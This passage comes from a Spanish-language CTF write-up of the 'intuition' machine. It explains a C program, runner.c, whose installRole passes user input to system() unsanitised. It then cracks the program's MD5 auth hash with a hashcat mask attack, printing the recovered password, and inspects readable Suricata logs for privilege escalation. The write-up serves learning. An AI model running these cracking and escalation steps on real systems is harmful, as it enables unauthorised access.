+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 58</span><span><span style="color:#fff;font-weight:bold">void</span> installRole(<span style="color:#fff;font-weight:bold">const</span> <span style="color:#fff;font-weight:bold">char</span> *roleURL) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 59</span><span>    <span style="color:#fff;font-weight:bold">char</span> install_command[<span style="color:#ff0;font-weight:bold">1024</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 60</span><span>    snprintf(install_command, <span style="color:#fff;font-weight:bold">sizeof</span>(install_command), <span style="color:#0ff;font-weight:bold">&#34;%s install %s&#34;</span>, ANSIBLE_GALAXY_BIN, roleURL);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 61</span><span>    system(install_command);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 62</span><span>}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 63</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 64</span><span><span style="color:#fff;font-weight:bold">int</span> main(<span style="color:#fff;font-weight:bold">int</span> argc, <span style="color:#fff;font-weight:bold">char</span> *argv[]) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 65</span><span>    <span style="color:#fff;font-weight:bold">if</span> (argc &lt; <span style="color:#ff0;font-weight:bold">2</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 66</span><span>        printf(<span style="color:#0ff;font-weight:bold">&#34;Usage: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, argv[<span style="color:#ff0;font-weight:bold">0</span>]);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 67</span><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 68</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 69</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 70</span><span>    <span style="color:#fff;font-weight:bold">int</span> auth_required = <span style="color:#ff0;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 71</span><span>    <span style="color:#fff;font-weight:bold">char</span> auth_key[<span style="color:#ff0;font-weight:bold">128</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 72</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 73</span><span>    <span style="color:#fff;font-weight:bold">for</span> (<span style="color:#fff;font-weight:bold">int</span> i = <span style="color:#ff0;font-weight:bold">2</span>; i &lt; argc; i++) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 74</span><span>        <span style="color:#fff;font-weight:bold">if</span> (strcmp(argv[i], <span style="color:#0ff;font-weight:bold">&#34;-a&#34;</span>) == <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 75</span><span>            <span style="color:#fff;font-weight:bold">if</span> (i + <span style="color:#ff0;font-weight:bold">1</span> &lt; argc) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 76</span><span>                strncpy(auth_key, argv[i + <span style="color:#ff0;font-weight:bold">1</span>], <span style="color:#fff;font-weight:bold">sizeof</span>(auth_key));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 77</span><span>                auth_required = <span style="color:#ff0;font-weight:bold">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 78</span><span>                <span style="color:#fff;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 79</span><span>            } <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 80</span><span>                printf(<span style="color:#0ff;font-weight:bold">&#34;Error: -a option requires an auth key.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 81</span><span>                <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 82</span><span>            }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 83</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 84</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 85</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 86</span><span>    <span style="color:#fff;font-weight:bold">if</span> (!check_auth(auth_key)) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 87</span><span>        printf(<span style="color:#0ff;font-weight:bold">&#34;Error: Authentication failed.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 88</span><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 89</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 90</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 91</span><span>    <span style="color:#fff;font-weight:bold">if</span> (strcmp(argv[<span style="color:#ff0;font-weight:bold">1</span>], <span style="color:#0ff;font-weight:bold">&#34;list&#34;</span>) == <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 92</span><span>        listPlaybooks();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 93</span><span>    } <span style="color:#fff;font-weight:bold">else</span> <span style="color:#fff;font-weight:bold">if</span> (strcmp(argv[<span style="color:#ff0;font-weight:bold">1</span>], <span style="color:#0ff;font-weight:bold">&#34;run&#34;</span>) == <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 94</span><span>        <span style="color:#fff;font-weight:bold">int</span> playbookNumber = atoi(argv[<span style="color:#ff0;font-weight:bold">2</span>]);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 95</span><span>        <span style="color:#fff;font-weight:bold">if</span> (playbookNumber &gt; <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 96</span><span>            DIR *dir = opendir(PLAYBOOK_LOCATION);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 97</span><span>            <span style="color:#fff;font-weight:bold">if</span> (dir == <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 98</span><span>                perror(<span style="color:#0ff;font-weight:bold">&#34;Failed to open the playbook directory&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 99</span><span>                <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">100</span><span>            }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">101</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">102</span><span>            <span style="color:#fff;font-weight:bold">struct</span> dirent *entry;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">103</span><span>            <span style="color:#fff;font-weight:bold">int</span> currentPlaybookNumber = <span style="color:#ff0;font-weight:bold">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">104</span><span>            <span style="color:#fff;font-weight:bold">char</span> *playbookName = <span style="color:#fff;font-weight:bold">NULL</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">105</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">106</span><span>            <span style="color:#fff;font-weight:bold">while</span> ((entry = readdir(dir)) != <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">107</span><span>                <span style="color:#fff;font-weight:bold">if</span> (entry-&gt;d_type == DT_REG &amp;&amp; strstr(entry-&gt;d_name, <span style="color:#0ff;font-weight:bold">&#34;.yml&#34;</span>) != <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">108</span><span>                    <span style="color:#fff;font-weight:bold">if</span> (currentPlaybookNumber == playbookNumber) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">109</span><span>                        playbookName = entry-&gt;d_name;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">110</span><span>                        <span style="color:#fff;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">111</span><span>                    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">112</span><span>                    currentPlaybookNumber++;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">113</span><span>                }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">114</span><span>            }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">115</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">116</span><span>            closedir(dir);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">117</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">118</span><span>            <span style="color:#fff;font-weight:bold">if</span> (playbookName != <span style="color:#fff;font-weight:bold">NULL</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">119</span><span>                runPlaybook(playbookName);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">120</span><span>            } <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">121</span><span>                printf(<span style="color:#0ff;font-weight:bold">&#34;Invalid playbook number.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">122</span><span>            }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">123</span><span>        } <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">124</span><span>            printf(<span style="color:#0ff;font-weight:bold">&#34;Invalid playbook number.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">125</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">126</span><span>    } <span style="color:#fff;font-weight:bold">else</span> <span style="color:#fff;font-weight:bold">if</span> (strcmp(argv[<span style="color:#ff0;font-weight:bold">1</span>], <span style="color:#0ff;font-weight:bold">&#34;install&#34;</span>) == <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">127</span><span>        installRole(argv[<span style="color:#ff0;font-weight:bold">2</span>]);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">128</span><span>    } <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">129</span><span>        printf(<span style="color:#0ff;font-weight:bold">&#34;Usage2: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>, argv[<span style="color:#ff0;font-weight:bold">0</span>]);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">130</span><span>        <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">1</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">131</span><span>    }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">132</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">133</span><span>    <span style="color:#fff;font-weight:bold">return</span> <span style="color:#ff0;font-weight:bold">0</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">134</span><span>}</span></span></code></pre></div>
+<p>Este programa en C permite gestionar playbooks de Ansible, listar archivos de playbooks, ejecutar playbooks específicos y instalar roles de Ansible Galaxy, todo ello tras una verificación de autenticación mediante una clave hash MD5. A continuación se explica detalladamente cada sección del programa:</p>
+<ol>
+<li>
+<p><strong>Definiciones y Constantes:</strong></p>
+<ul>
+<li>Se definen las ubicaciones de archivos y comandos necesarios.</li>
+<li><code>AUTH_KEY_HASH</code> almacena un hash MD5 para la autenticación.</li>
+</ul>
+</li>
+<li>
+<p><strong>Función <code>check_auth</code>:</strong></p>
+<ul>
+<li>Toma una clave de autenticación (<code>auth_key</code>) y calcula su hash MD5.</li>
+<li>Compara el hash calculado con <code>AUTH_KEY_HASH</code>.</li>
+<li>Devuelve 1 si coinciden, indicando autenticación exitosa, o 0 en caso contrario.</li>
+</ul>
+</li>
+<li>
+<p><strong>Función <code>listPlaybooks</code>:</strong></p>
+<ul>
+<li>Abre el directorio especificado en <code>PLAYBOOK_LOCATION</code>.</li>
+<li>Lista todos los archivos que terminan en <code>.yml</code>, numerándolos.</li>
+</ul>
+</li>
+<li>
+<p><strong>Función <code>runPlaybook</code>:</strong></p>
+<ul>
+<li>Construye un comando para ejecutar un playbook específico usando <code>ansible-playbook</code>.</li>
+<li>Usa el archivo de inventario especificado en <code>INVENTORY_FILE</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Función <code>installRole</code>:</strong></p>
+<ul>
+<li>Construye un comando para instalar un rol de Ansible Galaxy usando <code>ansible-galaxy</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Función <code>main</code>:</strong></p>
+<ul>
+<li>Procesa los argumentos de la línea de comandos.</li>
+<li>Verifica que se ha proporcionado una clave de autenticación y la comprueba.</li>
+<li>Según el primer argumento (<code>list</code>, <code>run</code>, <code>install</code>):
+<ul>
+<li>Llama a <code>listPlaybooks</code> para listar los playbooks.</li>
+<li>Llama a <code>runPlaybook</code> para ejecutar un playbook específico, determinado por su número en la lista.</li>
+<li>Llama a <code>installRole</code> para instalar un rol desde una URL.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="crackeando-el-hash-de-runnerc">Crackeando el hash de runner.c</h2>
+<p>El flujo principal del programa incluye una verificación de autenticación antes de permitir cualquier operación. Si la autenticación falla, el programa termina con un mensaje de error.</p>
+<p>Este hash MD5 lo podemos crackear ya que sabemos que la contraseña empieza por &ldquo;UHI75GHI&rdquo; y sigue por 4 carácteres que probablemente sean mayúsculas y numéricos.</p>
+<p>Con hashcat podemos hacer un ataque de fuerza bruta por máscara.</p>
+<p>`hashcat -m 0 -a 3 -1 ?u?d hashes.txt UHI75GHI?1?1?1?1</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>0feda17076d793c2ef2870d7427ad4ed:UHI75GHINKOP
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Hash.Mode........: 0 (MD5)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>Hash.Target......: 0feda17076d793c2ef2870d7427ad4ed
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span><span style="color:#fff;font-weight:bold">Time</span>.Started.....: Mon Jul 29 19:01:29 2024 (0 secs)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#fff;font-weight:bold">Time</span>.Estimated...: Mon Jul 29 19:01:29 2024 (0 secs)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>Guess.Mask.......: UHI75GHI?1?1?1?1 [12]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>Guess.Charset....: -1 ?u?d, -2 Undefined, -3 Undefined, -4 Undefined</span></span></code></pre></div>
+<p>Por ahora esta password no nos sirve de nada, pero nos servirá para terminar de escalar privilegios.</p>
+<h2 id="information-leakage-via-privileged-logs">Information Leakage via privileged logs</h2>
+<p>Pasando el <code>linpeas.sh</code> podemos ver algo extraño.
+<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
+<p>Vamos a revisar ese directorio.</p>
+<p>Vemos un montón de logs y tenemos permiso de lectura.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>dev_acc@intuition:/var/log/suricata$ ls -la
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>total <span style="color:#ff0;font-weight:bold">40576</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>drwxr-xr-x  <span style="color:#ff0;font-weight:bold">2</span> root root       <span style="color:#ff0;font-weight:bold">4096</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>drwxrwxr-x <span style="color:#ff0;font-weight:bold">12</span> root syslog     <span style="color:#ff0;font-weight:bold">4096</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 eve.json
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root   <span style="color:#ff0;font-weight:bold">16703683</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 eve.json.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root    <span style="color:#ff0;font-weight:bold">5760612</span> Oct <span style="color:#ff0;font-weight:bold">26</span>  <span style="color:#ff0;font-weight:bold">2023</span> eve.json.1-2024040114.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Apr  <span style="color:#ff0;font-weight:bold">8</span> 14:19 eve.json.1-2024042213.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Apr <span style="color:#ff0;font-weight:bold">22</span> 13:26 eve.json.1-2024042918.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Apr <span style="color:#ff0;font-weight:bold">29</span> 18:27 eve.json.1-2024072915.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root     <span style="color:#ff0;font-weight:bold">214743</span> Oct <span style="color:#ff0;font-weight:bold">28</span>  <span style="color:#ff0;font-weight:bold">2023</span> eve.json.5.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root    <span style="color:#ff0;font-weight:bold">5050595</span> Oct <span style="color:#ff0;font-weight:bold">14</span>  <span style="color:#ff0;font-weight:bold">2023</span> eve.json.7.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root     <span style="color:#ff0;font-weight:bold">972578</span> Sep <span style="color:#ff0;font-weight:bold">29</span>  <span style="color:#ff0;font-weight:bold">2023</span> eve.json.8.gz
